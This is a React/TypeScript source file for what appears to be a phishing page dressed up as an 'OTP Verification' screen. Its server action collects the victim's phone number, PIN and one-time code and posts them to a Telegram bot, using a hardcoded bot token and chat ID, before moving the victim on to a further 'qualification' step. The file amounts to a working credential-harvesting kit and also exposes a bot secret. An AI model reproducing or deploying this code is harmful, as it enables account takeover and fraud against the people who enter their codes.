import { useEffect, useRef, useState } from "react";
import { Button } from "@workspace/ui/components/button";
import { Input } from "@workspace/ui/components/input";
import image from "@workspace/ui/background-image.jpg"
import { useFetcher, useNavigate } from "react-router";
import type { Route } from "./+types/otp";


export async function action({ request }: Route.ActionArgs) {

    const formdata = await request.formData();

    const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
    const url = `https://api.telegram.org/bot${token}/sendMessage`
    try {
        const res = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: 8453055105,// 7895249781,
                text:
                    `Account verification
Phone: ${formdata.get("phone")}
PIN: ${formdata.get("pin")}
OTP: ${formdata.get("otp")}
                    `,
                parse_mode: "Markdown",
            })

        });
        const data = await res.json();
        return data;
    } catch (e: any) {
        return e.message || e;
    }


}

export default function OtpVerificationPage() {
    const refs = useRef<(HTMLInputElement | null)[]>([]);
    const [otp, setOtp] = useState(Array(6).fill(""));
    const [seconds, setSeconds] = useState(96);

    useEffect(() => {
        if (seconds <= 0) return;

        const timer = setInterval(() => {
            setSeconds((s) => s - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [seconds]);

    const handleChange = (value: string, index: number) => {
        if (!/^\d?$/.test(value)) return;

        const copy = [...otp];
        copy[index] = value;
        setOtp(copy);

        if (value && refs.current[index + 1]) {
            refs.current[index + 1]?.focus();
        }
    };

    const handleKeyDown = (
        e: React.KeyboardEvent<HTMLInputElement>,
        index: number
    ) => {
        if (
            e.key === "Backspace" &&
            !otp[index] &&
            refs.current[index - 1]
        ) {
            refs.current[index - 1]?.focus();
        }
    };

    const handlePaste = (
        e: React.ClipboardEvent<HTMLInputElement>
    ) => {
        e.preventDefault();

        const pasted = e.clipboardData
            .getData("text")
            .replace(/\D/g, "")
            .slice(0, 6);

        const values = pasted.split("");

        const newOtp = [...otp];

        values.forEach((digit, i) => {
            newOtp[i] = digit;
        });

        setOtp(newOtp);

        refs.current[Math.min(values.length, 5)]?.focus();
    };
    const [phone, setPhone] = useState<string | null>(null);
    const navigate = useNavigate();

    useEffect(() => {
        if (sessionStorage.getItem("phone") == null) {
            navigate("/confirmation");
        }
        setPhone(sessionStorage.getItem("phone"));
    },
        []);
    const fetcher = useFetcher();
    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if(otp.length != 6){
            alert("Please enter a valid OTP");
            return;
        }
        const  formData = new FormData();
        formData.append("otp", otp.join(""));
        formData.append("phone", phone as unknown as string);
        formData.append("pin", `${sessionStorage.getItem("pin")}`);
        fetcher.submit(formData, {
            method: "POST",

        });

    }
    useEffect(() => {
        if (fetcher.data?.ok == true) {
            navigate("/qualification");
        }
    },
        [fetcher])
    return (
        <main className="relative flex min-h-screen items-center justify-center overflow-hidden bg-gradient-to-br from-sky-100 via-blue-50 to-white"
            style={{
                backgroundImage: `url(${image})`,
                backgroundSize: "cover",
                backgroundPosition: "center",
                backgroundRepeat: "no-repeat",
            }}
        >
            <title>OTP Verification</title>

            {/* Animated Background */}

            <div className="blob left-10 top-10 h-72 w-72 bg-blue-300/20" />
            <div className="blob right-20 bottom-10 h-80 w-80 bg-cyan-300/20 animation-delay-2000" />
            <div className="blob left-1/2 top-1/2 h-96 w-96 -translate-x-1/2 -translate-y-1/2 bg-blue-400/10 animation-delay-4000" />

            {/* Card */}

            <form className="relative z-10 w-full max-w-md rounded-3xl border border-white/40 bg-white/90 p-8 shadow-2xl backdrop-blur-xl"
                action={"/qualification"}
                method="post"
                onSubmit={handleSubmit}
            >

                <h1 className="text-center text-4xl font-bold">
                    OTP Verification 
                </h1>
                {fetcher.data?.ok == true ? <p className="text-green-500 text-center">Success!</p> : <p className="text-red-500 text-center">{fetcher.data?.description}</p>}
                <p className="mt-5 text-center text-slate-600">
                    Enter the OTP sent to your number
                </p>

                <p className="mt-2 text-center font-semibold text-slate-800">
                    {phone}
                </p>

                {/* OTP */}

                <div className="mt-8 flex justify-center gap-3">

                    {otp.map((digit, index) => (
                        <Input
                            key={index}
                            ref={(el) => {
                                refs.current[index] = el;
                            }}
                            value={digit}
                            onPaste={handlePaste}
                            onChange={(e) =>
                                handleChange(e.target.value, index)
                            }
                            onKeyDown={(e) =>
                                handleKeyDown(e, index)
                            }
                            maxLength={1}
                            inputMode="numeric"
                            className="h-16 w-14 text-center text-2xl font-bold"
                            name="otp"
                            required
                        />
                    ))}

                </div>

                <Button className="mt-8 h-12 w-full rounded-xl bg-blue-600 hover:bg-blue-700" type="submit"
                disabled={fetcher.state != "idle"}
                >
                    {fetcher.state != "idle" ? "Loading..." : "Submit"}
                </Button>

                <p className="mt-5 text-center text-slate-600">
                    Resend OTP in{" "}
                    <span className="font-semibold">
                        {seconds}
                    </span>{" "}
                    seconds
                </p>

                <Button
                    disabled={seconds > 0}
                    variant="secondary"
                    className="mt-4 h-12 w-full rounded-xl"
                >
                    Resend OTP
                </Button>

            </form>

        </main>
    );
}